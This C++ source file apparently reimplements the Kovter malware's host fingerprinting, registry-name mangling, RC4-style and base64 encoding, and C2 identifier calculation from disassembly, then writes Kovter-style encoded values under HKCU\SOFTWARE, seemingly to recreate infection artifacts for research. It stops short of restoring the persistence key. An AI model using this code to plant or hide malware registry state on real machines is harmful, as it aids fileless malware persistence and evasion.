// kovter_computer_name_generator.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <windows.h>
#include "ntdll.h" 


typedef struct _regEntry {
	char *clearRegName;
	char *mangledRegName;
	char *mangledRegName_sentinel;
	unsigned char *buf;
	size_t bufSize;
	char *subKey;
} regEntry;

char *myWideToAscii(char *inbuf, size_t inbufSize);
void make_malicious_key(regEntry *cur_RE);

char *base64_encode(const unsigned char *data,
	size_t input_length,
	size_t *output_length);

unsigned char *base64_decode(const char *data,
	size_t input_length,
	size_t *output_length);

char *md5(char *initial_msg, size_t initial_len);
char *generate_random_lowercase_str_len_4_to_10_from_seed(char *in);
char *calculate_UID(char *installDate, ULONG cbInstallDate, char* digProd, ULONG cbDigProd, char *computerName);
void HexDump(const void* data, size_t size);
char *getName(char *asciiComputerName, char *digProdId, char *installDate, ULONG cbDigProdId, ULONG cbInstallDate);

const char key[] = "2d5563ed288ac5396add9b78fbca810b";
char alphabet[] = "qwertyuiopasdfghjklzxcvbnm";

// mangles the registry key names
char* generateRegName(char *uniqRegistryName, const char *keyNameClear) {
	char tmpBuf[0x100] = { 0 };
	strcat(tmpBuf, uniqRegistryName);
	strcat(tmpBuf, keyNameClear);
	strcat(tmpBuf, uniqRegistryName);
	strcat(tmpBuf, key);
	char *md5_1 = md5(tmpBuf, strlen(tmpBuf));
	md5_1[8] = 0;
	_strlwr(md5_1);
	char *mangledName = generate_random_lowercase_str_len_4_to_10_from_seed(md5_1);
	
	return mangledName;

}
unsigned char *generateRandomLowerHexStr_7_bytes() {
	unsigned char *result = (unsigned char*)malloc(8);
	const char digits[] = "abcdef0123456789";
	for (int i = 0; i < 7; i++) {
		result[i] = digits[rand() % strlen(digits)];
	}
	result[7] = 0;
	return result;
}

// return value will be buffer of size bufLen (same as input)
unsigned char *xorDecodeString_2(unsigned char *buf, ULONG bufLen, unsigned char *key, ULONG keyLen) {
	unsigned char *result = (unsigned char*)malloc(bufLen);
	memcpy(result, buf, bufLen);
	int table_256[256] = { 0 };
	for (ULONG i = 0; i < 256; i++) {
		table_256[i] = i;
	}
	int muddle = 0;
	for (ULONG i = 0; i < 256; i++) {
		muddle = key[i % keyLen] + table_256[i] + muddle;
		muddle %= 256;
		int swap = table_256[i];
		table_256[i] = table_256[muddle];
		table_256[muddle] = swap;
	}

	int muddle2 = 0;
	int counter = 0;
	for (ULONG i = 0; i < bufLen; i++) {
		counter += 1;
		counter %= 256;
		muddle2 = table_256[counter] + muddle2;
		muddle2 %= 256;
		int swap2 = table_256[counter];
		table_256[counter] = table_256[muddle2];
		table_256[muddle2] = swap2;
		result[i] ^= table_256[(table_256[counter] + table_256[muddle2]) % 256];
	}
	return result;
}

// See 0x0441974, xor_encode_and_b64()
WCHAR *encodeForRegistry(unsigned char *clear, ULONG clearLen) {
	unsigned char *innerKey = generateRandomLowerHexStr_7_bytes();
	unsigned char *enc1 = xorDecodeString_2(clear, clearLen, innerKey, 7);
	innerKey = (unsigned char*)realloc(innerKey, clearLen + 7);
	memcpy(innerKey + 7, enc1, clearLen);
	unsigned char *enc2 = xorDecodeString_2(innerKey, clearLen + 7, (unsigned char*)key, strlen(key));
	free(enc1);

	size_t b64_len = 0;
	char *b64_encoded = base64_encode((const unsigned char*)enc2, clearLen + 7, &b64_len);
	if (b64_len != strlen(b64_encoded)) {
		printf("b64_len != strlen(b64_encoded)! (%d != %d) Exitting!\n", b64_len, strlen(b64_encoded));
		exit(1);
	}
	WCHAR *b64_encoded_w = (WCHAR*)malloc(b64_len * 2 + 2);
	wsprintf(b64_encoded_w, L"%S", b64_encoded);
	free(b64_encoded);
	free(enc2);
	free(innerKey);
	return b64_encoded_w;
}

char *myWideToAscii(char *inbuf, size_t inbufSize) {
	char *outbuf = (char*)malloc(inbufSize / 2);
	memset(outbuf, 0, inbufSize / 2);
	for (size_t i = 0; i < inbufSize; i += 2) {
		outbuf[i / 2] = inbuf[i];
	}
	return outbuf;
}

// See 0x0441A0C, base64_expand_and_xor()
unsigned char *decodeFromRegistry(const char *encoded, size_t encodedLen, size_t *outLen) {
	unsigned char *deflate = NULL;
	size_t deflateLen = 0;
	printf("decodeFromRegistry about to base64_decode\n");
	deflate = base64_decode(encoded,encodedLen, &deflateLen);
	printf("deflate 0x%X encoded 0x%X encodedLen %d deflateLen %d\n", deflate, encoded, encodedLen, deflateLen);

	printf("decodeFromRegistry about to xorDecodeString_2\n");
	unsigned char *decode1 = xorDecodeString_2(deflate, deflateLen, (unsigned char*)key, strlen(key));
	unsigned char innerKey[8] = { 0 };
	memcpy(innerKey, decode1, 7);

	printf("decodeFromRegistry about to xorDecodeString_2 (2)\n");
	printf("deflateLen - 7 == %d\n", deflateLen - 7);
	//HexDump(decode1 + 7, deflateLen - 7);
	//HexDump(innerKey, 7);
	unsigned char *decode2 = xorDecodeString_2(decode1 + 7, deflateLen - 7, innerKey, 7);

	free(decode1);
	free(deflate);
	*outLen = deflateLen - 7;
	printf("decodeFromRegistry about to hexdump\n");
	HexDump(decode2, *outLen);
	return decode2;
}

// this will return a buffer encoded to be put into the registry
WCHAR *ijow_epoch_time_of_install(ULONG epochTimeOfInstall) {
	char epochStr[0x10] = { 0 };
	snprintf(epochStr, 0x10, "%d", epochTimeOfInstall);
	return encodeForRegistry((unsigned char*)epochStr, strlen(epochStr));
}

void queryRegistryKey(HKEY hKey, const char *lpSubKey, const char *valueName, char **value_out, ULONG *cbValue_out) {
	HKEY hkResult;
	DWORD type = 0;

	*cbValue_out = 0;
	if(!RegOpenKeyExA(hKey, lpSubKey, 0, 0x101, &hkResult))
	{
		printf("queryRegistryKey: opened key %s\n", lpSubKey);
		if (!RegQueryValueExA(hkResult, valueName, 0, &type, 0, cbValue_out))
		{
			printf("queryRegistryKey: key is %d bytes\n", *cbValue_out);
			*value_out = (char*)malloc(*cbValue_out);
			memset(*value_out, 0, *cbValue_out);
			NTSTATUS status = RegQueryValueExA(hkResult, valueName, 0, &type, (LPBYTE)*value_out, cbValue_out);
			printf("queryRegistryKey: status 0x%X, key is %s\n", status, *value_out);
			
		}
		RegCloseKey(hkResult);
	}
}

bool CreateKey(HKEY hKey, char *lpSubKey) {
	HKEY hkResult = NULL;
	LONG nError = RegOpenKeyExA(hKey, lpSubKey, 0, KEY_CREATE_SUB_KEY, &hkResult);
	if (nError == ERROR_FILE_NOT_FOUND) {
		nError = RegCreateKeyExA(hKey, lpSubKey, NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, NULL);
		RegCloseKey(hkResult);
		return true;
	}
	else if (nError) {
		printf("nError %d, GetLastError() %d\n", nError, GetLastError());
	}
	printf("hkResult = = 0x%X\n", hkResult);
	RegCloseKey(hkResult);
	return false;
}

const WCHAR software_reg[] = L"SOFTWARE";

unsigned char *readRegFile(char *mangledName, size_t *bufize) {

	HANDLE hFile = NULL;
	DWORD fileSize = 0;
	unsigned char *buf = NULL;
	DWORD bytesRead = 0;
	char tmp[0x100] = { 0 };
	*bufize = 0;

	snprintf(tmp, 0x100, "%s_extracted", mangledName);

	hFile = CreateFileA(tmp,               // file to open
		GENERIC_READ,          // open for reading
		FILE_SHARE_READ,       // share for reading
		NULL,                  // default security
		OPEN_EXISTING,         // existing file only
		FILE_ATTRIBUTE_NORMAL, // normal file
		NULL);                 // no attr. template


	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Couldn't open %s!\n", tmp);
		exit(1);
	}


	fileSize = GetFileSize(hFile, NULL);
	printf("filesize 0x%X\n", fileSize);
	if (INVALID_FILE_SIZE == fileSize) {
		printf("Couldn't get the file size!\n");
		exit(1);
	}

	buf = (unsigned char*)malloc(fileSize);
	memset(buf, 0, fileSize);
	*bufize = fileSize;

	if (FALSE == ReadFile(hFile, buf, fileSize, &bytesRead, NULL))
	{
		printf("Terminal failure: Unable to read from file.\n GetLastError=%08x\n", GetLastError());
		CloseHandle(hFile);
		exit(1);
	}

	if (bytesRead != fileSize) {
		printf("Error! Only read %d bytes out of %d!\n", bytesRead, fileSize);
		exit(1);
	}
	printf("Successfully read the file\n");
	return buf;
}

regEntry *initializeRegEntry(const char *clearRegName, char *uniqComputerName, char *SERVICE_uniqComputerName) {
	regEntry *ret = (regEntry*)malloc(sizeof(regEntry));
	memset(ret, 0, sizeof(regEntry));

	ret->clearRegName = (char*)malloc(strlen(clearRegName));
	strcpy(ret->clearRegName, clearRegName);
	ret->mangledRegName_sentinel = generateRegName(SERVICE_uniqComputerName, ret->clearRegName);
	ret->mangledRegName = generateRegName(uniqComputerName, ret->clearRegName);
	ret->buf = readRegFile(ret->mangledRegName_sentinel, &ret->bufSize);
	ret->subKey = (char*)malloc(10 + strlen(uniqComputerName));
	memset(ret->subKey, 0, 10 + strlen(uniqComputerName));
	snprintf(ret->subKey, 0x100, "SOFTWARE\\%s", uniqComputerName);
	
	return ret;
}


// skips making regValue('8')  == wrapped persistances key
void make_all_malcious_keys(char *uniqComputerName, char *SERVICE_uniqComputerName) {
	// create the overarching key (HCKU\SOFTWARE\uniqueComputerName for example)
	char subKey[0x100] = { 0 };
	snprintf(subKey, 0x100, "SOFTWARE\\%s", uniqComputerName);
	printf("Creating path %s (if doesn't already exist)...\n", subKey);
	CreateKey(HKEY_CURRENT_USER, subKey);

	// TODO: fix regEntry memory leaks with a desturctor that frees that elements of the struct
	const char *clearNames[] = { "2", "5","7", "20", "30" };
	regEntry *cur_RE = NULL;;
	for (int i = 0; i < sizeof(clearNames) / sizeof(char*); i++) {
		cur_RE = initializeRegEntry(clearNames[i], uniqComputerName, SERVICE_uniqComputerName);
		printf("%s => %s (%s) \n", clearNames[i], cur_RE->mangledRegName, cur_RE->mangledRegName_sentinel);
		make_malicious_key(cur_RE);
	}
	
	cur_RE = initializeRegEntry("8", uniqComputerName, SERVICE_uniqComputerName);
	printf("CREATE THIS KEY ON YOUR OWN!  %s => %s (%s) \n", "8", cur_RE->mangledRegName, cur_RE->mangledRegName_sentinel);

	// tdmvrakitd may be the UID sent over the wire to the C2
	char *digProdId = NULL;
	char *installDate = NULL;
	//WCHAR computerName[40] = { 0 };
	char asciiComputerName[40] = { 0 };
	DWORD computerNameSize = 40;
	ULONG cbDigProdId = 0;
	ULONG cbInstallDate = 0;

	queryRegistryKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion", "DigitalProductId", &digProdId, &cbDigProdId);
	queryRegistryKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion", "InstallDate", &installDate, &cbInstallDate);

	GetComputerNameA(asciiComputerName, &computerNameSize);
	char *tdmvrakitd = calculate_UID(installDate, cbInstallDate, digProdId, cbDigProdId, uniqComputerName);
	WCHAR *tdmvrakitd_encoded = encodeForRegistry((unsigned char*)tdmvrakitd, strlen(tdmvrakitd));

	regEntry *tdmvrakitd_RE = initializeRegEntry("3", uniqComputerName, SERVICE_uniqComputerName);
	tdmvrakitd_RE->buf = (unsigned char*)tdmvrakitd_encoded;
	tdmvrakitd_RE->bufSize = wcslen(tdmvrakitd_encoded) + 2;
	make_malicious_key(tdmvrakitd_RE);

	//print time.ctime(1531787474)
	//Mon Jul 16 19:31 : 14 2018
	WCHAR *ijow_encoded = ijow_epoch_time_of_install(1481324011);

	regEntry *ijow_RE = initializeRegEntry("4", uniqComputerName, SERVICE_uniqComputerName);
	ijow_RE->buf = (unsigned char*)ijow_encoded;
	ijow_RE->bufSize = wcslen(ijow_encoded) + 2;
	make_malicious_key(ijow_RE);
}

void make_malicious_key(regEntry *cur_RE) {
	UNICODE_STRING ValueName = { 0 };
	wchar_t mangledRegName_w[0x100] = { 0 };
	mbstowcs(mangledRegName_w, cur_RE->mangledRegName, 0x100);

	ValueName.Buffer = mangledRegName_w;
	ValueName.Length = 2 * wcslen(mangledRegName_w);
	ValueName.MaximumLength = 0;

	HKEY hkResult = NULL;
	LONG nError = RegOpenKeyExA(HKEY_CURRENT_USER, cur_RE->subKey, 0, KEY_SET_VALUE, &hkResult);
	if (!NtSetValueKey(hkResult, &ValueName, 0, REG_SZ, cur_RE->buf, cur_RE->bufSize)) {
		printf("SUCCESS setting %s value in registry!\n", cur_RE->mangledRegName);
	}
	
	RegCloseKey(hkResult);

}

int main()
{
	NtSetValueKey = (_NtSetValueKey)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtSetValueKey");
	RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlInitUnicodeString");
	srand((unsigned int)time(NULL));

	char *digProdId = NULL;
	char *installDate = NULL;
	//WCHAR computerName[40] = { 0 };
	char asciiComputerName[40] = { 0 };
	DWORD computerNameSize = 40;
	ULONG cbDigProdId = 0;
	ULONG cbInstallDate = 0;

	queryRegistryKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion", "DigitalProductId", &digProdId, &cbDigProdId);
	queryRegistryKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion", "InstallDate", &installDate, &cbInstallDate);
	
	GetComputerNameA(asciiComputerName, &computerNameSize);

	// convert the computer name to ascii
	printf("productID:\n");
	HexDump(digProdId, cbDigProdId);
	printf("installDate:\n");
	HexDump(installDate, cbInstallDate);
	printf("asciiComputerName %s\n", asciiComputerName);
	char *uniqComputerName = getName(asciiComputerName, digProdId, installDate, cbDigProdId, cbInstallDate);
	printf("uniqComputerName = %s\n", uniqComputerName);

	make_all_malcious_keys(uniqComputerName, (char*)"ytwrdxzd");
}

char *getName(char *asciiComputerName, char *digProdId, char *installDate, ULONG cbDigProdId, ULONG cbInstallDate) {

	char tripleKeyMd5[32] = { 0 };
	char *initalMd5 = NULL;
	char *tripleKey = (char*)malloc(strlen(key) * 3 + 1);
	memset(tripleKey, 0, strlen(key) * 3 + 1);

	if (strlen(installDate) <= 2)
	{
		printf("in case 1\n");
		strcat(tripleKey, key);
		strcat(tripleKey, key);
		strcat(tripleKey, key);

		initalMd5 = md5(tripleKey, strlen(tripleKey));
	}
	else
	{
		char tmpBuf[0x1000] = { 0 };
		ULONG cur = 0;

		memcpy(tmpBuf, installDate, cbInstallDate);
		cur += cbInstallDate;
		printf("cur == %d\n", cur);

		memcpy(tmpBuf + cur, key, strlen(key));
		cur += strlen(key);
		printf("cur == %d\n", cur);

		memcpy(tmpBuf + cur, key, strlen(key));
		cur += strlen(key);
		printf("cur == %d\n", cur);

		memcpy(tmpBuf + cur, digProdId, cbDigProdId);
		cur += cbDigProdId;
		printf("cur == %d\n", cur);

		memcpy(tmpBuf + cur, key, strlen(key));
		cur += strlen(key);
		printf("cur == %d\n", cur);

		memcpy(tmpBuf + cur, asciiComputerName, strlen(asciiComputerName));
		cur += strlen(asciiComputerName);
		printf("cur == %d\n", cur);

		memcpy(tmpBuf + cur, "1_11", 4);
		cur += 4;
		printf("cur == %d\n", cur);
		//HexDump(tmpBuf, cur);

		initalMd5 = md5(tmpBuf, cur);
	}
	printf("done with generateUniqueComputerName()\n");
	// end generateUniqueComputerName() == 0x446B4C

	//begin giantInit(), starting a 0x044F0D2, to 0x044F16F (the call to generate_random_lowercase_str_len_4_to_10_from_seed)
	
	// lower case the md5, hash that, then grab the first 16 bytes, then lower case again
	printf("initalMd5 before lower %s\n", initalMd5);
	_strlwr(initalMd5);
	printf("initalMd5 after lower %s\n", initalMd5);
	char *secondMd5 = md5(initalMd5, 32);
	free(initalMd5);

	// could copy the first 16 bytes, or just set a null at the 17th byte
	//strncpy(dest, secondMd5, 16);
	secondMd5[16] = 0;	
	printf("secondMd5 before lower %s\n", secondMd5);
	_strlwr(secondMd5);
	printf("secondMd5 after lower %s\n", secondMd5);

	// end giantInit segemnt
	char *result = NULL;
	printf("about to  generate_random_lowercase_str_len_4_to_10_from_seed()\n");
	result = generate_random_lowercase_str_len_4_to_10_from_seed(secondMd5);
	
    return result;
}

// See 0x44343C
//  UID sent over the wire to the C2
char *calculate_UID(char *installDate, ULONG cbInstallDate, char* digProd, ULONG cbDigProd, char *computerName) {
	char tmp[0x1000] = { 0 };
	ULONG cur = 0;
	memcpy(tmp + cur, installDate, cbInstallDate);
	cur += cbInstallDate;

	memcpy(tmp + cur, digProd, cbDigProd);
	cur += cbDigProd;

	memcpy(tmp + cur, computerName, strlen(computerName));
	cur += strlen(computerName);

	memcpy(tmp + cur, key, strlen(key));
	cur += strlen(key);

	memcpy(tmp + cur, key, strlen(key));
	cur += strlen(key);

	memcpy(tmp + cur, "1_22", strlen("1_22"));
	cur += strlen("1_22");

	char *result = md5(tmp, cur);
	result[16] = 0;
	return result;
}

// in is a 16 byte, lowercase hex string
char *generate_random_lowercase_str_len_4_to_10_from_seed(char *in) {
	uint8_t byteVals[8] = { 0 };
	char *result = NULL;
	ULONG resultLen = 0;
	char *inMd5 = md5(in, strlen(in));

	// process the first 16 hex chars of inMd5
	for (int i = 0; i < 8; i++) {
		char tmp[3];
		memcpy(tmp, inMd5 + (i * 2), 2);
		tmp[2] = 0;
		ULONG tmp2 = strtol(tmp, NULL, 16);
		if (tmp2 < 256) {
			byteVals[i] = (uint8_t)tmp2;
		}
		else {
			printf("ERROR!\n");
			exit(1);
		}
	}

	int seed1 = 4;
	int hexProduct = byteVals[0] * byteVals[1];
	if (hexProduct > 0) {
		do {
			seed1 += 1;
			if (seed1 > 10)
				seed1 = 4;
			hexProduct--;
		} while (hexProduct);
	}

	int seed2 = 0;
	int seed3 = 0;
	if (seed1 > 0) {
		do {
			seed2 += 1;
			if (seed2 > 8) 
				seed2 = 1;
			seed3 = 1;
			int cur = (int)(byteVals[seed2 - 1]);
			if (cur > 0) {
				do {
					seed3 += 1;
					if (seed3 > 26)
						seed3 = 1;
					cur--;
				} while (cur);
			}
			char curChar = alphabet[seed3-1];
			result = (char*)realloc(result, resultLen + 1 + 1);
			result[resultLen] = curChar;
			result[resultLen + 1] = 0;
			resultLen += 1;
			seed1--;
		} while (seed1);
	}
	return result;
}


void HexDump(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		}
		else {
			ascii[i % 16] = '.';
		}
		if ((i + 1) % 8 == 0 || i + 1 == size) {
			printf(" ");
			if ((i + 1) % 16 == 0) {
				printf("|  %s \n", ascii);
			}
			else if (i + 1 == size) {
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i + 1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

// md5 code from https://gist.github.com/jcppython/ad4d957ab66cf5b4aa3732662395fd6b

// leftrotate function definition
#define LEFTROTATE(x, c) (((x) << (c)) | ((x) >> (32 - (c))))


char *md5(char *initial_msg, size_t initial_len) {
	// These vars will contain the hash
	uint32_t h0, h1, h2, h3;

	// Message (to prepare)
	uint8_t *msg = NULL;

	// Note: All variables are unsigned 32 bit and wrap modulo 2^32 when calculating

	// r specifies the per-round shift amounts

	uint32_t r[] = { 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
		5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,
		4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
		6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21 };

	// Use binary integer part of the sines of integers (in radians) as constants// Initialize variables:
	uint32_t k[] = {
		0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
		0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
		0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
		0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
		0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
		0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
		0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
		0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
		0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
		0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
		0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
		0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
		0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
		0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
		0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
		0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391 };

	h0 = 0x67452301;
	h1 = 0xefcdab89;
	h2 = 0x98badcfe;
	h3 = 0x10325476;

	// Pre-processing: adding a single 1 bit
	//append "1" bit to message    
	/* Notice: the input bytes are considered as bits strings,
	where the first bit is the most significant bit of the byte.[37] */

	// Pre-processing: padding with zeros
	//append "0" bit until message length in bit ≡ 448 (mod 512)
	//append length mod (2 pow 64) to message

	int new_len;
	for (new_len = initial_len * 8 + 1; new_len % 512 != 448; new_len++);
	new_len /= 8;

	msg = (uint8_t*)malloc(new_len + 64); // also appends "0" bits 
								   // (we alloc also 64 extra bytes...)
	memset(msg, 0, new_len + 64);
	memcpy(msg, initial_msg, initial_len);
	msg[initial_len] = 128; // write the "1" bit

	uint32_t bits_len = 8 * initial_len; // note, we append the len
	memcpy(msg + new_len, &bits_len, 4);           // in bits at the end of the buffer

												   // Process the message in successive 512-bit chunks:
												   //for each 512-bit chunk of message:
	int offset;
	for (offset = 0; offset<new_len; offset += (512 / 8)) {

		// break chunk into sixteen 32-bit words w[j], 0 ≤ j ≤ 15
		uint32_t *w = (uint32_t *)(msg + offset);

		// Initialize hash value for this chunk:
		uint32_t a = h0;
		uint32_t b = h1;
		uint32_t c = h2;
		uint32_t d = h3;

		// Main loop:
		uint32_t i;
		for (i = 0; i<64; i++) {

			uint32_t f, g;

			if (i < 16) {
				f = (b & c) | ((~b) & d);
				g = i;
			}
			else if (i < 32) {
				f = (d & b) | ((~d) & c);
				g = (5 * i + 1) % 16;
			}
			else if (i < 48) {
				f = b ^ c ^ d;
				g = (3 * i + 5) % 16;
			}
			else {
				f = c ^ (b | (~d));
				g = (7 * i) % 16;
			}

			uint32_t temp = d;
			d = c;
			c = b;
			b = b + LEFTROTATE((a + f + k[i] + w[g]), r[i]);
			a = temp;



		}

		// Add this chunk's hash to result so far:

		h0 += a;
		h1 += b;
		h2 += c;
		h3 += d;

	}
	char *result = (char*)malloc(33);
	memset(result, 0, 33);
	//var char digest[16] := h0 append h1 append h2 append h3 //(Output is in little-endian)
	uint8_t *p;

	char tmp[9] = { 0 };
	// display result

	p = (uint8_t *)&h0;
	snprintf(tmp, 9, "%2.2X%2.2X%2.2X%2.2X", p[0], p[1], p[2], p[3]);
	strcat(result, tmp);

	p = (uint8_t *)&h1;
	snprintf(tmp, 9, "%2.2X%2.2X%2.2X%2.2X", p[0], p[1], p[2], p[3]);
	strcat(result, tmp);

	p = (uint8_t *)&h2;
	snprintf(tmp, 9, "%2.2X%2.2X%2.2X%2.2X", p[0], p[1], p[2], p[3]);
	strcat(result, tmp);

	p = (uint8_t *)&h3;
	snprintf(tmp, 9, "%2.2X%2.2X%2.2X%2.2X", p[0], p[1], p[2], p[3]);
	strcat(result, tmp);
	
	if (strlen(result) > 32) {
		printf("ERROR IN MD5! strlen is %d, not 32! %s\n", strlen(result), result);
		exit(1);
	}
	// cleanup
	free(msg);
	return result;
}

// base 64 code from https://www.mycplus.com/source-code/c-source-code/base64-encode-decode/
static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
'w', 'x', 'y', 'z', '0', '1', '2', '3',
'4', '5', '6', '7', '8', '9', '+', '/' };
static char *decoding_table = NULL;
static int mod_table[] = { 0, 2, 1 };


void build_decoding_table() {

	decoding_table = (char *)malloc(256);
	memset(decoding_table, 0, 256);
	for (int i = 0; i < 64; i++)
		decoding_table[(unsigned char)encoding_table[i]] = i;
}


void base64_cleanup() {
	free(decoding_table);
}

char *base64_encode(const unsigned char *data,
	size_t input_length,
	size_t *output_length) {

	*output_length = 4 * ((input_length + 2) / 3);

	char *encoded_data = (char*)malloc(*output_length + 1);
	memset(encoded_data, 0, *output_length + 1);
	if (encoded_data == NULL) return NULL;

	for (size_t i = 0, j = 0; i < input_length;) {

		uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

		uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

		encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
	}

	for (int i = 0; i < mod_table[input_length % 3]; i++)
		encoded_data[*output_length - 1 - i] = '=';
	encoded_data[*output_length] = 0;
	return encoded_data;
}


unsigned char *base64_decode(const char *data,
	size_t input_length,
	size_t *output_length) {

	if (decoding_table == NULL) build_decoding_table();

	if (input_length % 4 != 0) return NULL;

	*output_length = input_length / 4 * 3;
	if (data[input_length - 1] == '=') (*output_length)--;
	if (data[input_length - 2] == '=') (*output_length)--;

	unsigned char *decoded_data = (unsigned char*)malloc(*output_length);
	memset(decoded_data, 0, *output_length);
	if (decoded_data == NULL) return NULL;

	for (size_t i = 0, j = 0; i < input_length;) {

		uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

		uint32_t triple = (sextet_a << 3 * 6)
			+ (sextet_b << 2 * 6)
			+ (sextet_c << 1 * 6)
			+ (sextet_d << 0 * 6);

		if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
	}

	return decoded_data;
}
